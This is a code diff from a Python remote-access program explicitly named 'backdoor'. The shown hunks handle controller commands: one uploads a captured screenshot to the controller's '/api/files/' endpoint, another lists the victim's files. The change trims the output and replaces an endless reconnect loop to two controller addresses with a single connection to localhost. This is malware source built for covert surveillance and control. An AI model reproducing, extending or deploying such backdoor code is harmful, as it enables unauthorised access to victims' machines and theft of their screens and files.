@@ -80,7 +80,7 @@ class backdoor:
                 sample_file = open("screenshot.png", "rb")
                 upload_file = {"file": sample_file}
                 r = requests.post(f"{self.url}api/files/", files = upload_file)
-                output += f"{self.url}media/files/screenshot.png"
+                output += f"{self.url}media/files/screenshot.png\n"
             elif command.startswith("ls"):
                 output = ""
                 for i in os.listdir():
@@ -242,13 +242,7 @@ class backdoor:
         return output
     
 
-while True:
-    try:
-        backdoor("http://127.0.0.1:8000/") 
-    except:
-        pass
-    try: 
-        backdoor("http://10.2.100.100:8000/") 
-    except:
-        pass
+
+backdoor("http://127.0.0.1:8000/") 
+
   
